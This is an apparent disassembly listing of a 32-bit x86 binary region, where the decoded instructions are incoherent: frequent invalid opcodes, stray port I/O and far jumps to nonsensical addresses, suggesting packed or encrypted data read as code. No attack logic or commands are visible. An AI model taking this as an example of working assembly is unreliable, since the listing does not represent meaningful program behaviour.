  4221ff:	lea    eax,[eax-0x71]
  422202:	add    al,0xde
  422204:	mov    dh,0x6c
  422206:	sahf   
  422207:	xor    ebx,DWORD PTR [ebp-0x3b]
  42220a:	dec    esp
  42220b:	mov    dh,0x35
  42220d:	xor    cl,BYTE PTR [ecx+eiz*8+0x27]
  422211:	jmp    0x422267
  422213:	dec    esp
  422214:	or     eax,DWORD PTR [ebx]
  422216:	push   eax
  422217:	inc    edx
  422218:	es add edi,esi
  42221b:	(bad)  
  42221c:	mov    edx,0xc5e1bc1d
  422221:	stos   DWORD PTR es:[edi],eax
  422222:	xchg   esi,eax
  422223:	jp     0x4221d3
  422225:	jne    0x4221de
  422227:	(bad)  
  422228:	aad    0x30
  42222a:	lods   eax,DWORD PTR ds:[esi]
  42222b:	ins    BYTE PTR es:[edi],dx
  42222c:	add    BYTE PTR [edi-0x57],bl
  42222f:	std    
  422230:	clc    
  422231:	cmp    ch,BYTE PTR [ebx+0x61c3bd43]
  422237:	add    dl,BYTE PTR [edi+0x1369bb39]
  42223d:	rcl    DWORD PTR [ecx+0x33],1
  422240:	dec    esi
  422241:	imul   esi,DWORD PTR [eax],0xcbbdfa71
  422247:	pop    ds
  422248:	lahf   
  422249:	ret    0x8dc
  42224c:	mov    esi,0x25d15b5a
  422251:	in     eax,dx
  422252:	mov    eax,ds:0xa976a68
  422257:	adc    eax,DWORD PTR [ebx-0x5c]
  42225a:	pop    esi
  42225b:	aas    
  42225c:	mov    ds:0xadcc2a6d,al
  422261:	or     BYTE PTR [eax-0x5b],dh
  422264:	cmp    al,0x45
  422266:	mov    ds:0x8e91cc74,al
  42226b:	push   cs
  42226c:	jb     0x422292
  42226e:	mov    al,0xb6
  422270:	cld    
  422271:	ss stos BYTE PTR es:[edi],al
  422273:	ins    DWORD PTR es:[edi],dx
  422274:	lds    ebx,FWORD PTR [ebx+0x2dc1dc85]
  42227a:	outs   dx,DWORD PTR ds:[esi]
  42227b:	scas   al,BYTE PTR es:[edi]
  42227c:	in     al,dx
  42227d:	jle    0x422224
  42227f:	fs cdq 
  422281:	xor    DWORD PTR [edx],0xe3d9ed10
  422287:	add    eax,0x27e5b3d2
  42228c:	pop    ss
  42228d:	outs   dx,BYTE PTR ds:[esi]
  42228e:	mov    cl,0x7b
  422290:	xchg   BYTE PTR [esi],ch
  422292:	adc    BYTE PTR [ebp+0x6c],dl
  422295:	scas   al,BYTE PTR es:[edi]
  422296:	mov    ds:0x974f9bfd,eax
  42229b:	ins    BYTE PTR es:[edi],dx
  42229c:	xchg   ebx,eax
  42229d:	lds    esi,FWORD PTR [edi]
  42229f:	sbb    BYTE PTR [esi-0x5a9ec844],al
  4222a5:	(bad)  
  4222a6:	lea    edi,[ecx]
  4222a8:	push   esp
  4222a9:	sahf   
  4222aa:	jnp    0x422323
  4222ac:	mov    eax,0x75503442
  4222b1:	cmp    cl,ah
  4222b3:	ret    
  4222b4:	jge    0x42227b
  4222b6:	sub    BYTE PTR [edx+0x11],cl
  4222b9:	leave  
  4222ba:	dec    ebp
  4222bb:	gs data16 and bh,ah
  4222bf:	clc    
  4222c0:	push   0x1c
  4222c2:	inc    eax
  4222c3:	fild   DWORD PTR [ebx-0x21c1da52]
  4222c9:	mov    ds:0x13dcdd60,al
  4222ce:	adc    al,0x4d
  4222d0:	pop    esp
  4222d1:	mov    esp,0x3ac8986
  4222d6:	inc    DWORD PTR [edx]
  4222d8:	jmp    0x228972d4
  4222dd:	mov    esp,0x25c5398a
  4222e2:	pop    ecx
  4222e3:	mov    BYTE PTR [edi+0x61584957],al
  4222e9:	cmp    edi,ecx
  4222eb:	loop   0x4222f5
	...
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	dec    ebx
  422363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422364:	imul   esp,DWORD PTR [edx-0x31],0x6e
  422368:	add    DWORD PTR [eax],eax
  42236a:	inc    DWORD PTR [eax]
  42236c:	add    BYTE PTR [eax],al
  42236e:	add    al,BYTE PTR [edx+0x1e]
  422371:	and    DWORD PTR [ecx-0x52960987],ebp
  422377:	ret    0xb61e
  42237a:	iret   
  42237b:	xchg   esp,eax
  42237c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42237d:	pushf  
  42237e:	and    DWORD PTR [ebx-0x36],edx
  422381:	push   ebp
  422382:	nop
  422383:	clc    
  422384:	cdq    
  422385:	scas   al,BYTE PTR es:[edi]
  422386:	mov    ah,0xca
  422388:	xchg   ecx,eax
  422389:	mov    ds:0xb96c95ae,al
  42238e:	inc    ebp
  42238f:	push   eax
  422390:	mov    bl,0x6a
  422392:	xlat   BYTE PTR ds:[ebx]
  422393:	imul   edi,DWORD PTR [eax+esi*8-0x32cb36b],0x2e35731
  42239e:	jo     0x422394
  4223a0:	xchg   ecx,eax
  4223a1:	inc    esp
  4223a2:	add    ch,ch
  4223a4:	loopne 0x422402
  4223a6:	in     eax,0x2b
  4223a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a9:	bnd jg 0x4223a2
  4223ac:	cmp    ecx,DWORD PTR [esi]
  4223ae:	int3   
  4223af:	(bad)  
  4223b0:	lock test eax,0x24fc9c66
  4223b6:	or     DWORD PTR [eax-0x63],ebp
  4223b9:	adc    al,ah
  4223bb:	inc    edx
  4223bc:	mov    edx,0x6a3bb991
  4223c1:	(bad)  
  4223c2:	out    0x25,eax
  4223c4:	or     BYTE PTR [ecx-0x1e37e31],0x9
  4223cb:	sub    BYTE PTR [eax+0x47],dh
  4223ce:	sahf   
  4223cf:	lock sbb al,ah
  4223d2:	cmp    BYTE PTR [ecx],0x59
  4223d5:	in     eax,0x62
  4223d7:	dec    bx
  4223d9:	mov    DWORD PTR [edi+ebx*2+0x74],eax
  4223dd:	xchg   ebx,eax
  4223de:	and    al,0xce
  4223e0:	sub    al,0xfb
  4223e2:	loope  0x42236c
  4223e4:	xchg   ebp,eax
  4223e5:	clc    
  4223e6:	daa    
  4223e7:	std    
  4223e8:	pop    ss
  4223e9:	push   DWORD PTR [eax+0x65]
  4223ec:	inc    ebx
  4223ed:	shl    DWORD PTR [eax-0xf],cl
  4223f0:	push   edi
  4223f1:	call   ebp
  4223f3:	paddd  mm7,QWORD PTR [eax]
  4223f6:	cmc    
  4223f7:	cdq    
  4223f8:	ss mov bl,0xc
  4223fb:	xor    al,0x97
  4223fd:	mov    ecx,0x550c0182
  422402:	cmc    
  422403:	jo     0x422432
  422405:	jle    0x422476
  422407:	je     0x422445
  422409:	jl     0x42242f
  42240b:	xchg   edi,eax
  42240c:	lahf   
  42240d:	or     bl,BYTE PTR [esp+edi*1-0x51737204]
  422414:	rol    ecx,0x1f
  422417:	ds leave 
  422419:	dec    ecx
  42241a:	sub    al,BYTE PTR [eax+0x593b0d22]
  422420:	pusha  
  422421:	(bad)  
  422423:	pop    edi
  422424:	pushf  
  422425:	mov    bh,0x8a
  422427:	cmp    al,0xf4
  422429:	xlat   BYTE PTR ds:[ebx]
  42242a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42242b:	xchg   esp,eax
  42242c:	shl    esp,0x46
  42242f:	inc    ebp
  422430:	cld    
  422431:	mov    al,0x2
  422433:	int    0xdb
  422435:	pop    edx
  422436:	imul   ebx,ebp,0xf
  422439:	adc    ch,BYTE PTR [edx+0x2972e548]
  42243f:	aam    0xc9
  422441:	jmp    0xc47a4ce6
  422446:	push   esp
  422447:	out    0xed,eax
  422449:	push   edx
  42244a:	cmp    al,0x97
  42244c:	jb     0x4224c8
  42244e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42244f:	xor    al,0x1e
  422451:	les    eax,FWORD PTR [esi]
  422453:	fld    QWORD PTR [esi+ecx*4]
  422456:	das    
  422457:	ins    DWORD PTR es:[edi],dx
  422458:	cmp    eax,0xb1c0f1b3
  42245d:	je     0x422416
  42245f:	push   ebx
  422460:	and    BYTE PTR [ebx+0x79],bh
  422463:	xor    al,0xa8
  422465:	push   ds
  422466:	add    eax,0x62602903
  42246b:	stos   DWORD PTR es:[edi],eax
  42246c:	jmp    0x0:0x0
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	fwait
  4224e3:	adc    DWORD PTR [ebx],ecx
  4224e5:	pusha  
  4224e6:	into   
  4224e7:	outs   dx,DWORD PTR ds:[esi]
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	inc    DWORD PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	pushf  
  4224ef:	cmp    eax,0xa136b890
  4224f4:	arpl   WORD PTR [esi],si
  4224f6:	dec    eax
  4224f7:	xchg   edi,eax
  4224f8:	pop    ebp
  4224f9:	scas   eax,DWORD PTR es:[edi]
  4224fa:	add    DWORD PTR [edx-0x7a],esi
  4224fd:	js     0x4224ec
  4224ff:	jle    0x422541
  422501:	jp     0x422581
  422503:	iret   
  422504:	cdq    
  422505:	dec    bl
  422507:	rol    dl,cl
  422509:	dec    eax
  42250a:	jbe    0x42254b
  42250c:	push   edx
  42250d:	test   DWORD PTR [ebp-0x4b],edx
  422510:	jl     0x4224ba
  422512:	mov    bl,0x54
  422514:	(bad)  
  422515:	in     eax,0x4e
  422517:	mov    ecx,0x1835c4b6
  42251c:	nop
  42251d:	inc    ecx
  42251e:	or     al,0x88
  422520:	and    BYTE PTR [eax+0x5c],ah
  422523:	imul   ebp,DWORD PTR [edi-0x18],0x1b2d5cd0
  42252a:	cdq    
  42252b:	gs (bad) 
  42252d:	sub    ch,BYTE PTR [edi+0x63a2a53d]
  422533:	inc    eax
  422534:	xor    al,dh
  422536:	rol    DWORD PTR [ebx+edx*1],1
  422539:	repnz pusha 
  42253b:	loop   0x422509
  42253d:	fnstsw WORD PTR es:[edi-0x7c2d6aad]
  422544:	pusha  
  422545:	leave  
  422546:	jmp    0x4224e4
  422548:	push   ebp
  422549:	jmp    0x422567
  42254b:	bswap  ebp
  42254d:	ror    ch,cl
  42254f:	sub    BYTE PTR [ecx],dl
  422551:	call   0xbb89:0x27e6db2c
  422558:	fdiv   DWORD PTR [ebx]
  42255a:	mov    ch,0xff
  42255c:	xor    DWORD PTR [edi+0xd8ccc86],edi
  422562:	imul   edi,DWORD PTR [ecx+0x1e7c31a4],0x12
  422569:	das    
  42256a:	setno  al
  42256d:	je     0x42252c
  42256f:	jmp    0x34a1:0xe18475b9
  422576:	adc    ebp,ebx
  422578:	ins    DWORD PTR es:[edi],dx
  422579:	adc    edi,ebx
  42257b:	es jecxz 0x422546
  42257e:	ficomp WORD PTR [esi+ebp*4]
  422581:	adc    al,0x48
  422583:	jp     0x4225df
  422585:	cmp    esi,DWORD PTR [edi+0x57]
  422588:	addr16 xor ebx,ebp
  42258b:	jns    0x4225a4
  42258d:	shr    ch,cl
  42258f:	mov    dh,bl
  422591:	push   es
  422592:	lock xor bl,al
  422595:	mov    edx,0x67344a8e
  42259a:	outs   dx,BYTE PTR ds:[esi]
  42259b:	fwait
  42259c:	adc    al,0xcf
  42259e:	dec    ebp
  42259f:	pop    ss
  4225a0:	mov    WORD PTR [ecx+edx*4+0x20],cs
  4225a4:	popa   
  4225a5:	jno    0x422600
  4225a7:	push   ebp
  4225a8:	daa    
  4225a9:	add    eax,0xe7ea7f73
  4225ae:	pop    esp
  4225af:	sbb    cl,BYTE PTR [eax+ebp*8]
  4225b2:	mov    ds:0x7ebde6dd,eax
  4225b7:	cmp    dl,0xb5
  4225ba:	xor    DWORD PTR [esi-0x17],eax
  4225bd:	mov    esp,edx
  4225bf:	fstp   DWORD PTR [ecx+0xfd462a3]
  4225c5:	scas   al,BYTE PTR es:[edi]
  4225c6:	es int 0x6d
  4225c9:	test   BYTE PTR [edi],ch
  4225cb:	pop    ds
  4225cc:	dec    edi
  4225cd:	mov    eax,ds:0xf6093ca8
  4225d2:	lahf   
  4225d3:	scas   al,BYTE PTR es:[edi]
  4225d4:	out    dx,al
  4225d5:	popf   
  4225d6:	daa    
  4225d7:	in     al,dx
  4225d8:	and    ch,BYTE PTR [ebp+0x3a9d5e98]
  4225de:	pop    esi
  4225df:	dec    ebp
  4225e0:	jl     0x422631
  4225e2:	sbb    edi,DWORD PTR [edi+0x546c492b]
  4225e8:	imul   esi,DWORD PTR [edi+ebp*4+0xa0ba],0x0
	...
  422653:	add    BYTE PTR [eax],al
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx+0x7f6ea2f8]
  422664:	push   eax
  422665:	(bad)  
  422666:	int    0x70
  422668:	add    DWORD PTR [eax],eax
  42266a:	inc    DWORD PTR [eax]
  42266c:	add    BYTE PTR [eax],al
  42266e:	dec    eax
  42266f:	loopne 0x422632
  422671:	fistp  WORD PTR [ecx]
  422673:	sbb    BYTE PTR [ebx+0x17],ah
  422676:	fwait
  422677:	dec    edx
  422678:	jno    0x422658
  42267a:	sub    dh,cl
  42267c:	rcl    BYTE PTR [esi-0x7a],0x1f
  422680:	inc    edi
  422681:	xchg   edi,eax
  422682:	out    0x9c,eax
  422684:	mov    ecx,0xb2941616
  422689:	adc    DWORD PTR [ebx],esi
  42268b:	bound  esp,QWORD PTR [ebp+0x3bf6d1d0]
  422691:	js     0x42263c
  422693:	jne    0x4226a6
  422695:	jecxz  0x4226f3
  422697:	xor    esp,0xffffff99
  42269a:	mov    eax,ds:0x339b4a5f
  42269f:	dec    esi
  4226a0:	jle    0x422626
  4226a2:	shl    DWORD PTR [eax-0x43],cl
  4226a5:	mov    dl,0x40
  4226a7:	pusha  
  4226a8:	jae    0x422729
  4226aa:	fld    DWORD PTR [esi-0x74665a64]
  4226b0:	out    0xa4,al
  4226b2:	in     eax,dx
  4226b3:	sbb    esi,ebp
  4226b5:	xchg   edx,eax
  4226b6:	rcr    DWORD PTR [ecx-0x7dd1dd43],1
  4226bc:	xchg   ecx,eax
  4226bd:	leave  
  4226be:	lods   al,BYTE PTR ds:[esi]
  4226bf:	(bad)  
  4226c0:	in     al,dx
  4226c1:	test   DWORD PTR [edx-0x12],ebp
  4226c4:	jnp    0x4226b8
  4226c6:	push   eax
  4226c7:	fmul   DWORD PTR [eax+edx*2]
  4226ca:	mov    cs,WORD PTR [edx]
  4226cc:	sub    ebp,DWORD PTR [esi+edi*4-0x76]
  4226d0:	iret   
  4226d1:	mov    BYTE PTR [esi-0x31],cl
  4226d4:	dec    ecx
  4226d5:	xor    BYTE PTR [edx+0x31],dh
  4226d8:	cmp    ecx,DWORD PTR [edx+0x7a9cde97]
  4226de:	sub    bh,BYTE PTR [ecx+edx*2+0x57]
  4226e2:	mov    ebx,0xa494a61a
  4226e7:	pop    ds
  4226e8:	adc    eax,0xa8b06897
  4226ed:	outs   dx,BYTE PTR ds:[esi]
  4226ee:	fs out dx,eax
  4226f0:	mov    dl,BYTE PTR [ecx-0xe]
  4226f3:	outs   dx,BYTE PTR ds:[esi]
  4226f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f6:	inc    BYTE PTR [edx]
  4226f8:	jnp    0x422685
  4226fa:	popa   
  4226fb:	stc    
  4226fc:	xor    eax,0xe552678e
  422701:	xor    DWORD PTR [eax+edx*1+0x7e],0xfffffff9
  422706:	sbb    bh,ah
  422708:	xor    BYTE PTR [eax],ah
  42270a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270b:	inc    edx
  42270c:	lahf   
  42270d:	mov    bl,0x84
  42270f:	stos   DWORD PTR es:[edi],eax
  422710:	adc    edx,DWORD PTR cs:[ebx-0x1f]
  422714:	cmp    DWORD PTR [eax-0x43],eax
  422717:	lods   eax,DWORD PTR ds:[esi]
  422718:	mov    ecx,0xb95b4a80
  42271d:	ds (bad) 
  42271f:	in     al,dx
  422720:	std    
  422721:	icebp  
  422722:	ja     0x4226c3
  422724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422725:	xchg   edx,eax
  422726:	sti    
  422727:	(bad)  
  422728:	xor    al,0x20
  42272a:	push   esi
  42272b:	xlat   BYTE PTR ds:[ebx]
  42272c:	in     eax,0x81
  42272e:	mov    bl,BYTE PTR [edx]
  422730:	xchg   DWORD PTR [ecx],ebp
  422732:	ins    DWORD PTR es:[edi],dx
  422733:	xor    al,0xf4
  422735:	popa   
  422736:	jmp    0x63b6e5f4
  42273b:	mov    ch,0x61
  42273d:	add    edi,esp
  42273f:	cmp    BYTE PTR [ecx-0x24],0x57
  422743:	les    eax,FWORD PTR [ebx]
  422745:	ss stc 
  422747:	mov    bl,BYTE PTR gs:[ebx]
  42274a:	int    0x56
  42274c:	(bad)  
  42274d:	cli    
  42274e:	mov    eax,ds:0x92d4d7fc
  422753:	mov    ch,0x90
  422755:	aam    0x85
  422757:	pop    ebx
  422758:	jae    0x422725
  42275a:	sbb    al,0x9f
  42275c:	mov    ecx,0x71acff13
  422761:	jns    0x4226e5
  422763:	push   es
  422764:	outs   dx,BYTE PTR ds:[esi]
  422765:	das    
  422766:	xor    BYTE PTR [esi+ecx*4],0x30
  42276a:	and    eax,0x6512
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x7f7f01c8
  4227e3:	nop
  4227e4:	sub    dh,BYTE PTR [edi+0x171cc]
  4227ea:	inc    DWORD PTR [eax]
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	lods   al,BYTE PTR ds:[esi]
  4227ef:	jae    0x42285c
  4227f1:	sub    ebp,DWORD PTR gs:[eax]
  4227f4:	(bad)  
  4227f5:	push   di
  4227f7:	lahf   
  4227f8:	fnstsw WORD PTR [esp+ecx*1+0x45]
  4227fc:	or     al,0x76
  4227fe:	fcmovnbe st,st(1)
  422800:	mov    edx,DWORD PTR [esi]
  422802:	mov    esp,0xa3181dd
  422807:	and    BYTE PTR [ebp-0x6e600a07],bl
  42280d:	xlat   BYTE PTR ds:[ebx]
  42280e:	shr    BYTE PTR [esi+0x13b7bff3],1
  422814:	stos   BYTE PTR es:[edi],al
  422815:	mov    dl,BYTE PTR [ecx]
  422817:	jnp    0x422829
  422819:	sub    eax,0xeba98780
  42281e:	inc    edi
  42281f:	push   ebp
  422820:	xchg   DWORD PTR [edx+0x36],eax
  422823:	pop    ebp
  422824:	jl     0x4227cf
  422826:	inc    ebp
  422827:	jp     0x422850
  422829:	(bad)  
  42282b:	sar    DWORD PTR [ebx-0x65],0x7
  42282f:	shl    bl,cl
  422831:	std    
  422832:	and    al,0xab
  422834:	(bad)  
  422835:	xor    al,BYTE PTR [edx-0x38]
  422838:	cmp    al,0xca
  42283a:	inc    ebx
  42283b:	sub    al,0x4c
  42283d:	ret    0x158
  422840:	push   edx
  422841:	not    DWORD PTR [esi]
  422843:	xchg   dl,al
  422845:	or     BYTE PTR ds:[edx+0x4eb7c72f],dh
  42284c:	jecxz  0x4227f5
  42284e:	inc    ecx
  42284f:	(bad)  
  422850:	sub    al,0x89
  422852:	or     eax,0xac3ebe15
  422857:	mov    DWORD PTR [eax+eax*4-0x3b],edx
  42285b:	fs cmp BYTE PTR gs:[edx+eiz*2-0x58],bh
  422861:	inc    eax
  422862:	test   eax,0x5cc5a60b
  422867:	mov    ah,bh
  422869:	leave  
  42286a:	pop    ds
  42286b:	cli    
  42286c:	and    esp,DWORD PTR [edi+0x7f9de1a2]
  422872:	or     al,0x3f
  422874:	fsubr  DWORD PTR [ecx+0x2074370b]
  42287a:	cwde   
  42287b:	je     0x42285c
  42287d:	mov    ebp,eax
  42287f:	push   es
  422880:	retf   
  422881:	jl     0x4228d6
  422883:	(bad)  
  422884:	mov    edi,0x4c16f2c6
  422889:	fcom   QWORD PTR [ebx+0x5d]
  42288c:	fstp   QWORD PTR [ebx-0xf]
  42288f:	mov    ds:0xfd02d1bd,eax
  422894:	and    al,0xf6
  422896:	pop    edx
  422897:	in     al,dx
  422898:	pop    ds
  422899:	jge    0x4228de
  42289b:	mov    bl,0xb2
  42289d:	and    DWORD PTR [ebx+0x58],eax
  4228a0:	dec    ecx
  4228a1:	dec    ecx
  4228a2:	rol    BYTE PTR [eax],1
  4228a4:	jecxz  0x422861
  4228a6:	aaa    
  4228a7:	out    dx,eax
  4228a8:	cdq    
  4228a9:	xchg   edx,eax
  4228aa:	stos   BYTE PTR es:[edi],al
  4228ab:	push   edx
  4228ac:	cs inc esp
  4228ae:	shr    DWORD PTR [ebx-0x6b],1
  4228b1:	or     esp,DWORD PTR [ebp+ebx*4-0x41]
  4228b5:	xlat   BYTE PTR ds:[ebx]
  4228b6:	and    edi,DWORD PTR [eax+ecx*4+0x4cbb1bbb]
  4228bd:	cmp    eax,0x37beebac
  4228c2:	jecxz  0x42292a
  4228c4:	cmp    al,0x70
  4228c6:	xchg   esp,eax
  4228c7:	xchg   esi,eax
  4228c8:	xlat   BYTE PTR ds:[ebx]
  4228c9:	dec    edi
  4228ca:	push   edx
  4228cb:	scas   al,BYTE PTR es:[edi]
  4228cc:	xchg   edx,eax
  4228cd:	fisttp DWORD PTR [ecx+0x2af15e5d]
  4228d3:	xchg   ecx,eax
  4228d4:	push   ds
  4228d5:	pop    ebx
  4228d6:	mov    BYTE PTR [esi-0x46ec2beb],bh
  4228dc:	push   eax
  4228dd:	adc    edi,edi
  4228df:	push   es
  4228e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e1:	leave  
  4228e2:	mov    dl,0xd2
  4228e4:	cmp    esp,eax
  4228e6:	mov    dh,0x70
  4228e8:	stc    
  4228e9:	scas   eax,DWORD PTR es:[edi]
  4228ea:	and    al,0x5e
  4228ec:	jbe    0x4228ee
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4228ec
  422963:	push   es
  422964:	fcomp  QWORD PTR [ebx+ecx*8+0x72]
  422968:	add    DWORD PTR [eax],eax
  42296a:	inc    DWORD PTR [eax]
  42296c:	add    BYTE PTR [eax],al
  42296e:	sub    BYTE PTR [esi+0x16],al
  422971:	pop    ds
  422972:	retf   
  422973:	in     al,0x4c
  422975:	jmp    0x3de8:0x517d108a
  42297c:	cmp    eax,0x800fd680
  422981:	jae    0x422929
  422983:	cmp    edi,DWORD PTR [ecx]
  422985:	mov    ebx,0x805a263
  42298a:	push   es
  42298b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42298c:	call   0xd978:0xe9e209e0
  422993:	and    eax,0xaae3ae06
  422998:	cmp    ecx,DWORD PTR ds:0x571fa8ea
  42299e:	sti    
  42299f:	dec    esp
  4229a0:	sbb    eax,0x603fe48a
  4229a5:	xor    esi,DWORD PTR [esi+0x5b]
  4229a8:	or     eax,0xd058c20e
  4229ad:	mov    ch,0x11
  4229af:	add    al,0xb5
  4229b1:	cld    
  4229b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229b3:	pop    esp
  4229b4:	clc    
  4229b5:	mov    ds:0x4b148b3f,eax
  4229ba:	je     0x4229c2
  4229bc:	loope  0x4229f1
  4229be:	pcmpeqd mm0,QWORD PTR [esp+esi*8+0x3ca629db]
  4229c6:	fs retf 
  4229c8:	mov    DWORD PTR [eax+0x65f2c34e],0x1efba269
  4229d2:	bound  esp,QWORD PTR ds:0x849fec51
  4229d8:	sub    DWORD PTR [edi],0x8bf22617
  4229de:	cdq    
  4229df:	cmp    eax,0x7f939f24
  4229e4:	jae    0x4229df
  4229e6:	push   ss
  4229e7:	sub    al,0xdb
  4229e9:	out    dx,eax
  4229ea:	in     al,0x83
  4229ec:	xchg   edx,eax
  4229ed:	sbb    eax,DWORD PTR [eax+esi*2+0x5a525fe6]
  4229f4:	retf   
  4229f5:	mov    dl,0xc
  4229f7:	pop    esi
  4229f8:	lock test BYTE PTR [esi+0xd9f4e31],al
  4229ff:	mov    esi,0xa9b5c8ea
  422a04:	inc    dl
  422a06:	fistp  WORD PTR [esi+ebx*1+0x11]
  422a0a:	xlat   BYTE PTR ds:[ebx]
  422a0b:	stos   BYTE PTR es:[edi],al
  422a0c:	imul   BYTE PTR [ecx+0x3c8384d6]
  422a12:	fsub   QWORD PTR [ecx+esi*2]
  422a15:	jb     0x4229c6
  422a17:	and    al,0xdc
  422a19:	loop   0x422a1a
  422a1b:	sub    eax,DWORD PTR [ebx-0x49a76a97]
  422a21:	or     eax,0x93d7aa21
  422a26:	inc    ebx
  422a27:	je     0x4229fe
  422a29:	mov    bl,BYTE PTR [ecx-0x34d5af73]
  422a2f:	xlat   BYTE PTR ds:[ebx]
  422a30:	outs   dx,BYTE PTR ds:[esi]
  422a31:	js     0x422aa0
  422a33:	aad    0xeb
  422a35:	cs mov edx,0xe805a9ef
  422a3b:	cmp    al,0x2a
  422a3d:	jns    0x422aab
  422a3f:	push   esp
  422a40:	add    ebx,DWORD PTR [edi-0x10]
  422a43:	jae    0x422aa1
  422a45:	rcr    BYTE PTR [ecx+0x5f1b40e1],1
  422a4b:	mov    al,0x63
  422a4d:	pop    esi
  422a4e:	mov    ch,0x76
  422a50:	xchg   ebx,eax
  422a51:	push   esp
  422a52:	test   ebp,0x81d2b52b
  422a58:	xor    al,0xeb
  422a5a:	lock int3 
  422a5c:	dec    edi
  422a5d:	add    BYTE PTR [ecx+0x27f27f0a],bl
  422a63:	inc    ebx
  422a64:	jno    0x422a30
  422a66:	(bad)  
  422a67:	xor    dh,cl
  422a69:	idiv   DWORD PTR [eax+0x95c3]
	...
  422ad3:	add    BYTE PTR [eax],al
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	ins    DWORD PTR es:[edi],dx
  422ae3:	imul   eax,DWORD PTR [ebp+0x173cabe],0xff00
  422aed:	add    BYTE PTR [edx],dh
  422aef:	aaa    
  422af0:	cmc    
  422af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422af2:	adc    ebp,DWORD PTR [edi+0x7a61393a]
  422af8:	add    eax,0x70108b48
  422afd:	jl     0x422adc
  422aff:	ret    
  422b00:	hlt    
  422b01:	inc    edx
  422b02:	jge    0x422b76
  422b04:	sub    DWORD PTR gs:[ebx+ebp*4+0x66],esi
  422b09:	dec    eax
  422b0a:	add    al,0xec
  422b0c:	or     al,0x81
  422b0e:	mov    bh,0x6f
  422b10:	mov    ah,0x0
  422b12:	adc    BYTE PTR [edi],cl
  422b14:	aam    0x63
  422b16:	iret   
  422b17:	neg    DWORD PTR [eax+0x19d48cbb]
  422b1d:	and    DWORD PTR [edx+0x1501044a],ecx
  422b23:	mov    ebx,0x8283f3a3
  422b28:	mov    dl,0x45
  422b2a:	outs   dx,BYTE PTR ds:[esi]
  422b2b:	cmp    eax,0x54638fc1
  422b30:	loop   0x422b5e
  422b32:	lods   eax,DWORD PTR ds:[esi]
  422b33:	sub    eax,0xde432017
  422b38:	pop    ds
  422b39:	dec    esi
  422b3a:	pusha  
  422b3b:	loope  0x422b8e
  422b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b3e:	and    bl,BYTE PTR [eax]
  422b40:	scas   al,BYTE PTR es:[edi]
  422b41:	mov    eax,esp
  422b43:	push   ebp
  422b44:	jecxz  0x422b65
  422b46:	inc    eax
  422b47:	inc    edi
  422b48:	lods   eax,DWORD PTR ds:[esi]
  422b49:	fwait
  422b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b4b:	xchg   ah,bh
  422b4d:	sub    cl,BYTE PTR [ecx]
  422b4f:	hlt    
  422b50:	(bad)  
  422b52:	jecxz  0x422bab
  422b54:	mov    ds:0xb9aeabd3,al
  422b59:	and    bh,dl
  422b5b:	cmp    DWORD PTR [edx+0x6febc40f],edi
  422b61:	sub    al,0xce
  422b63:	mov    ah,0x31
  422b65:	sub    eax,0xf67256e4
  422b6a:	js     0x422b57
  422b6c:	ins    DWORD PTR es:[edi],dx
  422b6d:	mov    ah,0xf9
  422b6f:	ins    DWORD PTR es:[edi],dx
  422b70:	outs   dx,BYTE PTR ds:[esi]
  422b71:	sub    eax,0x263b6707
  422b76:	mov    ecx,0x39b4bc9
  422b7b:	pop    ebx
  422b7c:	or     al,0xef
  422b7e:	push   0xffffffa0
  422b80:	dec    esi
  422b81:	sbb    DWORD PTR [eax],esi
  422b83:	push   esp
  422b84:	mov    esi,0x5f4643cc
  422b89:	adc    DWORD PTR [ebx+0x45],edi
  422b8c:	pop    ss
  422b8d:	icebp  
  422b8e:	out    0x9d,eax
  422b90:	out    dx,al
  422b91:	adc    ebp,eax
  422b93:	mov    fs,WORD PTR [edi-0x191c097b]
  422b99:	dec    ecx
  422b9a:	int    0x7f
  422b9c:	or     BYTE PTR [eax+ebp*2-0x6c15f817],dh
  422ba3:	(bad)  
  422ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ba6:	scas   eax,DWORD PTR es:[edi]
  422ba7:	in     al,0x8d
  422ba9:	aaa    
  422baa:	jp     0x422b66
  422bac:	jmp    0x422be7
  422bae:	vshufpd ymm5,ymm5,YMMWORD PTR [ebp+0x11ea249e],0x18
  422bb7:	lods   al,BYTE PTR ds:[esi]
  422bb8:	into   
